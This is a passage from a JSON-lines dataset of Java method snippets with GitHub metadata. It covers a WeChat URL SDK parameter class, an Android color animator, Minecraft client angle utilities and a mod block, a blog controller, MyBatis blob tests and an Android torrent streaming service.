"https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33319, "method_name": "setGroupId", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setGroupId(int groupId) {\n    this.groupId = groupId;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33320, "method_name": "getTitle", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getTitle() {\n    return title;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33321, "method_name": "setTitle", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setTitle(String title) {\n    this.title = title;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33322, "method_name": "getKeywords", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getKeywords() {\n    return keywords;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33323, "method_name": "setKeywords", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setKeywords(String keywords) {\n    this.keywords = keywords;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33324, "method_name": "getDescription", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDescription() {\n    return description;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33325, "method_name": "setDescription", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setDescription(String description) {\n    this.description = description;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33326, "method_name": "getPage", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPage() {\n    return page == 0 ? \"\" : String.valueOf(page);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33327, "method_name": "setPage", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setPage(int page) {\n    this.page = page;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33328, "method_name": "getRows", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRows() {\n    return rows == 0 ? \"\" : String.valueOf(rows);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33329, "method_name": "setRows", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setRows(int rows) {\n    this.rows = rows;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33330, "method_name": "equals", "class_name": "UrlParam", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object o) {\n    if (this == o) return true;\n    if (!(o instanceof UrlParam)) return false;\n    UrlParam urlParam = (UrlParam) o;\n    return getAppid() == urlParam.getAppid() &&\n            getFrequency() == urlParam.getFrequency() &&\n            getIsMonitor() == urlParam.getIsMonitor() &&\n            getGroupId() == urlParam.getGroupId() &&\n            getPage() == urlParam.getPage() &&\n            getRows() == urlParam.getRows() &&\n            Objects.equals(getAppkey(), urlParam.getAppkey()) &&\n            Objects.equals(getUrl(), urlParam.getUrl()) &&\n            Objects.equals(getRequestUri(), urlParam.getRequestUri()) &&\n            Objects.equals(getDomain(), urlParam.getDomain()) &&\n            Objects.equals(getType(), urlParam.getType()) &&\n            Objects.equals(getCheckType(), urlParam.getCheckType()) &&\n            Objects.equals(getVisitType(), urlParam.getVisitType()) &&\n            Objects.equals(getLayerType(), urlParam.getLayerType()) &&\n            Objects.equals(getNewLandDomainUrl(), urlParam.getNewLandDomainUrl()) &&\n            Objects.equals(getTitle(), urlParam.getTitle()) &&\n            Objects.equals(getKeywords(), urlParam.getKeywords()) &&\n            Objects.equals(getDescription(), urlParam.getDescription());\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33331, "method_name": "hashCode", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {\n    return Objects.hash(getAppid(), getAppkey(), getUrl(), getRequestUri(), getDomain(), getType(), getCheckType(), getFrequency(), getIsMonitor(), getVisitType(), getLayerType(), getNewLandDomainUrl(), getGroupId(), getTitle(), getKeywords(), getDescription(), getPage(), getRows());\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33332, "method_name": "onAttachedToWindow", "class_name": "Practice02HsvEvaluatorLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        view = (Practice02HsvEvaluatorView) findViewById(R.id.objectAnimatorView);\n        animateBt = (Button) findViewById(R.id.animateBt);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                ObjectAnimator animator = ObjectAnimator.ofInt(view, \"color\", 0xffff0000, 0xff00ff00);\n                animator.setEvaluator(new HsvEvaluator()); // \u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 HsvEvaluator\n                animator.setInterpolator(new LinearInterpolator());\n                animator.setDuration(2000);\n                animator.start();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/practice02/Practice02HsvEvaluatorLayout.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 33333, "method_name": "evaluate", "class_name": "HsvEvaluator", "params": ["float", "Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "        public Integer evaluate(float fraction, Integer startValue, Integer endValue) {\n            // \u628a ARGB \u8f6c\u6362\u6210 HSV\n            Color.colorToHSV(startValue, startHsv);\n            Color.colorToHSV(endValue, endHsv);\n\n            // \u8ba1\u7b97\u5f53\u524d\u52a8\u753b\u5b8c\u6210\u5ea6\uff08fraction\uff09\u6240\u5bf9\u5e94\u7684\u989c\u8272\u503c\n            if (endHsv[0] - startHsv[0] > 180) {\n                endHsv[0] -= 360;\n            } else if (endHsv[0] - startHsv[0] < -180) {\n                endHsv[0] += 360;\n            }\n            outHsv[0] = startHsv[0] + (endHsv[0] - startHsv[0]) * fraction;\n            if (outHsv[0] > 360) {\n                outHsv[0] -= 360;\n            } else if (outHsv[0] < 0) {\n                outHsv[0] += 360;\n            }\n            outHsv[1] = startHsv[1] + (endHsv[1] - startHsv[1]) * fraction;\n            outHsv[2] = startHsv[2] + (endHsv[2] - startHsv[2]) * fraction;\n\n            // \u8ba1\u7b97\u5f53\u524d\u52a8\u753b\u5b8c\u6210\u5ea6\uff08fraction\uff09\u6240\u5bf9\u5e94\u7684\u900f\u660e\u5ea6\n            int alpha = startValue >> 24 + (int) ((endValue >> 24 - startValue >> 24) * fraction);\n\n            // \u628a HSV \u8f6c\u6362\u56de ARGB \u8fd4\u56de\n            return Color.HSVToColor(alpha, outHsv);\n        }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson6/practice02/Practice02HsvEvaluatorLayout.java", "stars": "2", "class_props": {"extends": null, "implements": ["TypeEvaluator"], "modifiers": ["private"]}}, {"id": 33334, "method_name": "getRotations", "class_name": "AngleUtil", "params": ["Entity"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float[] getRotations(Entity ent) {\n        double x = ent.posX;\n        double z = ent.posZ;\n        double y = ent.getEntityBoundingBox().maxY - 4.0;\n        return getRotationFromPosition(x, z, y);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33335, "method_name": "getRotationFromPosition", "class_name": "AngleUtil", "params": ["double", "double", "double"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float[] getRotationFromPosition(double x, double z, double y) {\n        double xDiff = x - Minecraft.getMinecraft().player.posX;\n        double zDiff = z - Minecraft.getMinecraft().player.posZ;\n        double yDiff = y - Minecraft.getMinecraft().player.posY;\n        double hypotenuse = Math.hypot(xDiff, zDiff);\n        float yaw = (float)(Math.atan2(zDiff, xDiff) * 180.0 / Math.PI) - 90.0f;\n        float pitch = (float)(-Math.atan2(yDiff, hypotenuse) * 180.0 / Math.PI);\n        return new float[]{yaw, pitch};\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33336, "method_name": "getRotationFromPosition", "class_name": "AngleUtil", "params": ["BlockPos"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float[] getRotationFromPosition(BlockPos pos) {\n        double xDiff = pos.getX() - Minecraft.getMinecraft().player.posX;\n        double zDiff = pos.getZ() - Minecraft.getMinecraft().player.posZ;\n        double yDiff = pos.getY() - Minecraft.getMinecraft().player.posY;\n        double hypotenuse = Math.hypot(xDiff, zDiff);\n        float yaw = (float)(Math.atan2(zDiff, xDiff) * 180.0 / Math.PI) - 90.0f;\n        float pitch = (float)(-Math.atan2(yDiff, hypotenuse) * 180.0 / Math.PI);\n        return new float[]{yaw, pitch};\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33337, "method_name": "resolveBestHitVec", "class_name": "AngleUtil", "params": ["Entity", "int", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "Vec3d", "snippet": "    public static Vec3d resolveBestHitVec(Entity entity, int precision, boolean evadeBlocks) {\n\n        try {\n            Vec3d headVec = mc.player.getPositionEyes(1.0f);\n            Vec3d bestHitVec = new Vec3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);\n            Vec3d interpolated = MathUtil.interpolateEntity(entity, mc.getRenderPartialTicks());\n\n            int offset = precision / 3;\n\n            float height = entity.getEyeHeight() / precision;\n            float width = (entity.width * 0.5f) / offset;\n\n            for (int offsetY = 0; offsetY <= precision; offsetY++) {\n                for (int offsetX = -offset; offsetX <= offset; offsetX++) {\n                    for (int offsetZ = -offset; offsetZ <= offset; offsetZ++) {\n                        Vec3d possibleVec = new Vec3d(interpolated.x + width * offsetX, interpolated.y + height * offsetY,\n                                interpolated.z + width * offsetZ);\n\n                        if (evadeBlocks) {\n                            RayTraceResult result = mc.player.getEntityWorld().rayTraceBlocks(headVec,\n                                    possibleVec);\n\n                            if(result != null) {\n                                continue;\n                            }\n\n                        }\n                        if (headVec.distanceTo(possibleVec) < headVec.distanceTo(bestHitVec)) {\n                            bestHitVec = possibleVec;\n                        }\n                    }\n                }\n            }\n\n            if (bestHitVec.x == Double.MAX_VALUE) {\n                bestHitVec = null;\n            }\n\n            return bestHitVec;\n        } catch (Throwable t) {\n            t.printStackTrace();\n            return entity.getPositionVector();\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33338, "method_name": "rayTrace", "class_name": "AngleUtil", "params": ["float", "float", "double"], "throws": null, "modifiers": ["public", "static"], "return_type": "Entity", "snippet": "    public static Entity rayTrace(float yaw, float pitch, double range) {\n        Entity entity = mc.getRenderViewEntity();\n\n        if (entity != null && mc.world != null) {\n            mc.pointedEntity = null;\n            double d0 = range;\n            float partialTicks = 1.0F;\n            mc.objectMouseOver = entity.rayTrace(d0, partialTicks);\n            double d1 = d0;\n            Vec3d vec3d = entity.getPositionEyes(partialTicks);\n\n            Vec3d vec31 = mc.player.getVectorForRotation(pitch, yaw);\n            Vec3d vec32 = vec3d.addVector(vec31.x * d0, vec31.y * d0, vec31.z * d0);\n            Entity pointedEntity = null;\n            Vec3d vec33 = null;\n            float f = 1.0F;\n            List list = mc.world.getEntitiesInAABBexcluding(entity,\n                    entity.getEntityBoundingBox().expand(vec31.x * d0, vec31.y * d0, vec31.z * d0)\n                            .expand( f, f, f),\n                    Predicates.and(EntitySelectors.NOT_SPECTATING, p_apply_1_ -> p_apply_1_ != null && p_apply_1_.canBeCollidedWith()));\n            double d2 = d1;\n\n            for (int i = 0; i < list.size(); ++i) {\n                Entity entity1 = (Entity) list.get(i);\n                float f1 = entity1.getCollisionBorderSize();\n                AxisAlignedBB axisalignedbb = entity1.getEntityBoundingBox().expand( f1,  f1, f1);\n                RayTraceResult raytraceresult = axisalignedbb.calculateIntercept(vec3d, vec32);\n\n                if (axisalignedbb.intersects(vec3d, vec32)) {\n                    if (d2 >= 0.0D) {\n                        pointedEntity = entity1;\n                        vec33 = raytraceresult == null ? vec3d : raytraceresult.hitVec;\n                        d2 = 0.0D;\n                    }\n                } else if (raytraceresult != null) {\n                    double d3 = vec3d.distanceTo(raytraceresult.hitVec);\n                    if (d3 < d2 || d2 == 0.0D) {\n                        if (entity1.getLowestRidingEntity() == entity.getLowestRidingEntity() && !entity1.canRiderInteract()) {\n                            if (d2 == 0.0D) {\n                                pointedEntity = entity1;\n                                vec3d = raytraceresult.hitVec;\n                            }\n                        } else {\n                            pointedEntity = entity1;\n                            vec3d = raytraceresult.hitVec;\n                            d2 = d3;\n                        }\n                    }\n                }\n            }\n\n            if (pointedEntity != null && (d2 < d1 || mc.objectMouseOver == null)) {\n                mc.objectMouseOver = new RayTraceResult(pointedEntity, vec33);\n\n                if (pointedEntity instanceof EntityLivingBase || pointedEntity instanceof EntityItemFrame) {\n                    return pointedEntity;\n                }\n            }\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33339, "method_name": "getAngleDifference", "class_name": "AngleUtil", "params": ["float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float getAngleDifference(float direction, float rotationYaw) {\n        float phi = Math.abs(rotationYaw - direction) % 360.0f;\n        return (phi > 180.0f) ? (360.0f - phi) : phi;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33340, "method_name": "isEntityInFov", "class_name": "AngleUtil", "params": ["EntityLivingBase", "double"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isEntityInFov(EntityLivingBase entity, double angle) {\n        return getAngleDifference(mc.player.rotationYaw, AngleUtil.getRotations(entity)[0]) < angle;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/util/AngleUtil.java", "stars": "12", "class_props": {"extends": null, "implements": ["Util"], "modifiers": ["public"]}}, {"id": 33341, "method_name": "archives", "class_name": "ContentArchivesController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String archives() {\n\n        return BASE_DIR + \"archives\";\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/controller/ContentArchivesController.java", "stars": "1", "class_props": {"extends": "ContentBaseController", "implements": null, "modifiers": ["public"]}}, {"id": 33342, "method_name": "showOne", "class_name": "ContentArchivesController", "params": ["String", "Model", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String showOne(@PathVariable String title, Model model, HttpServletResponse response) {\n        ArticleTagsVO vo = articleService.findArticleWithTagsByTitle(title);\n        // TODO \u4e0b\u4e2a\u7248\u672c\u4f18\u5316\u5904\u7406404\u903b\u8f91\n        if (vo == null) {\n            response.setStatus(HttpStatus.NOT_FOUND.value());\n            return BASE_DIR + \"404\";\n        }\n        model.addAttribute(\"post\", vo);\n        return BASE_DIR + \"post\";\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/controller/ContentArchivesController.java", "stars": "1", "class_props": {"extends": "ContentBaseController", "implements": null, "modifiers": ["public"]}}, {"id": 33343, "method_name": "initElements", "class_name": "SandRippleBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SandRippleBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33344, "method_name": "init", "class_name": "SandRippleBlock", "params": ["FMLCommonSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLCommonSetupEvent event) {\n\t\tfor (Biome biome : ForgeRegistries.BIOMES.getValues()) {\n\t\t\tboolean biomeCriteria = false;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_hills\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_lakes\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (!biomeCriteria)\n\t\t\t\tcontinue;\n\t\t\tbiome.addFeature(GenerationStage.Decoration.UNDERGROUND_ORES, new OreFeature(OreFeatureConfig::deserialize) {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean place(IWorld world, ChunkGenerator generator, Random rand, BlockPos pos, OreFeatureConfig config) {\n\t\t\t\t\tDimensionType dimensionType = world.getDimension().getType();\n\t\t\t\t\tboolean dimensionCriteria = false;\n\t\t\t\t\tif (dimensionType == DimensionType.OVERWORLD)\n\t\t\t\t\t\tdimensionCriteria = true;\n\t\t\t\t\tif (!dimensionCriteria)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\treturn super.place(world, generator, rand, pos, config);\n\t\t\t\t}\n\t\t\t}.withConfiguration(new OreFeatureConfig(OreFeatureConfig.FillerBlockType.create(\"sandripple\", \"sandripple\", blockAt -> {\n\t\t\t\tboolean blockCriteria = false;\n\t\t\t\tif (blockAt.getBlock() == Blocks.SAND.getDefaultState().getBlock())\n\t\t\t\t\tblockCriteria = true;\n\t\t\t\treturn blockCriteria;\n\t\t\t}), block.getDefaultState(), 32)).withPlacement(Placement.COUNT_RANGE.configure(new CountRangeConfig(32, 0, 0, 256))));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SandRippleBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 33345, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SandRippleBlock.java", "stars": "2", "class_props": {"extends": "FallingBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 33346, "method_name": "initDatabase", "class_name": "BlobTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void initDatabase() throws Exception {\n        try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/blobtest/MapperConfig.xml\")) {\n            sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n        }\n\n        BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n                \"org/apache/ibatis/submitted/blobtest/CreateDB.sql\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blobtest/BlobTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33347, "method_name": "testInsertBlobThenSelectAll", "class_name": "BlobTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testInsertBlobThenSelectAll() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            BlobMapper blobMapper = sqlSession.getMapper(BlobMapper.class);\n\n            byte[] myblob = new byte[] {1, 2, 3, 4, 5};\n            BlobRecord blobRecord = new BlobRecord(1, myblob);\n            int rows = blobMapper.insert(blobRecord);\n            assertEquals(1, rows);\n\n            // NPE here due to unresolved type handler\n            List<BlobRecord> results = blobMapper.selectAll();\n\n            assertEquals(1, results.size());\n            BlobRecord result = results.get(0);\n            assertEquals (blobRecord.getId(), result.getId());\n            assertTrue (blobsAreEqual(blobRecord.getBlob(), result.getBlob()));\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blobtest/BlobTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33348, "method_name": "testInsertBlobObjectsThenSelectAll", "class_name": "BlobTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void testInsertBlobObjectsThenSelectAll() {\n        try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n            BlobMapper blobMapper = sqlSession.getMapper(BlobMapper.class);\n\n            Byte[] myblob = new Byte[] {1, 2, 3, 4, 5};\n            BlobRecord blobRecord = new BlobRecord(1, myblob);\n            int rows = blobMapper.insert(blobRecord);\n            assertEquals(1, rows);\n\n            // NPE here due to unresolved type handler\n            List<BlobRecord> results = blobMapper.selectAllWithBlobObjects();\n\n            assertEquals(1, results.size());\n            BlobRecord result = results.get(0);\n            assertEquals (blobRecord.getId(), result.getId());\n            assertTrue (blobsAreEqual(blobRecord.getBlob(), result.getBlob()));\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blobtest/BlobTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33349, "method_name": "blobsAreEqual", "class_name": "BlobTest", "params": ["byte", "byte"], "throws": null, "modifiers": ["static"], "return_type": "boolean", "snippet": "    static boolean blobsAreEqual(byte[] blob1, byte[] blob2) {\n        if (blob1 == null) {\n            return blob2 == null;\n        }\n\n        if (blob2 == null) {\n            return blob1 == null;\n        }\n\n        boolean rc = blob1.length == blob2.length;\n\n        if (rc) {\n            for (int i = 0; i < blob1.length; i++) {\n                if (blob1[i] != blob2[i]) {\n                    rc = false;\n                    break;\n                }\n            }\n        }\n\n        return rc;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blobtest/BlobTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33350, "method_name": "getTorrentOptions", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "TorrentOptions", "snippet": "    private TorrentOptions getTorrentOptions() {\n        return new TorrentOptions.Builder()\n                .saveLocation(PrefUtils.get(this, Prefs.STORAGE_LOCATION, ButterApplication.getStreamDir()))\n                .removeFilesAfterStop(true)\n                .maxConnections(PrefUtils.get(this, Prefs.LIBTORRENT_CONNECTION_LIMIT, 200))\n                .maxDownloadSpeed(PrefUtils.get(this, Prefs.LIBTORRENT_DOWNLOAD_LIMIT, 0))\n                .maxUploadSpeed(PrefUtils.get(this, Prefs.LIBTORRENT_UPLOAD_LIMIT, 0))\n                .build();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33351, "method_name": "onCreate", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate() {\n        super.onCreate();\n        sThis = this;\n        Foreground.get().addListener(mForegroundListener);\n        mTorrentStreamServer = TorrentStreamServer.getInstance();\n        mTorrentStreamServer.setServerHost(NetworkUtils.getWifiIPAddress());\n        mTorrentStreamServer.setServerPort(Constants.SERVER_PORT);\n        mTorrentStreamServer.setTorrentOptions(getTorrentOptions());\n        mTorrentStreamServer.startTorrentStream();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33352, "method_name": "onDestroy", "class_name": "TorrentService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {\n        super.onDestroy();\n        Timber.d(\"onDestroy\");\n        if (mWakeLock != null && mWakeLock.isHeld())\n            mWakeLock.release();\n        mTorrentStreamServer.stopTorrentStream();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33353, "method_name": "onStartCommand", "class_name": "TorrentService", "params": ["Intent", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int onStartCommand(Intent intent, int flags, int startId) {\n        Timber.d(\"onStartCommand\");\n        return START_STICKY;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentService.java", "stars": "4", "class_props": {"extends": "Service", "implements": ["TorrentServerListener"], "modifiers": ["public"]}}, {"id": 33354, "method_name": "onBind", "class_name": "TorrentService", "params": ["Intent"], "throws": null, "modifiers": ["public"], "return_type": "IBinder", "snippet": "    public IBinder onBind(Intent intent) {\n        Timber.d(\"onBind\");\n\n        if (mInForeground) {\n            stopForeground();\n        }\n\n        return mBinder;\n    }", "url": 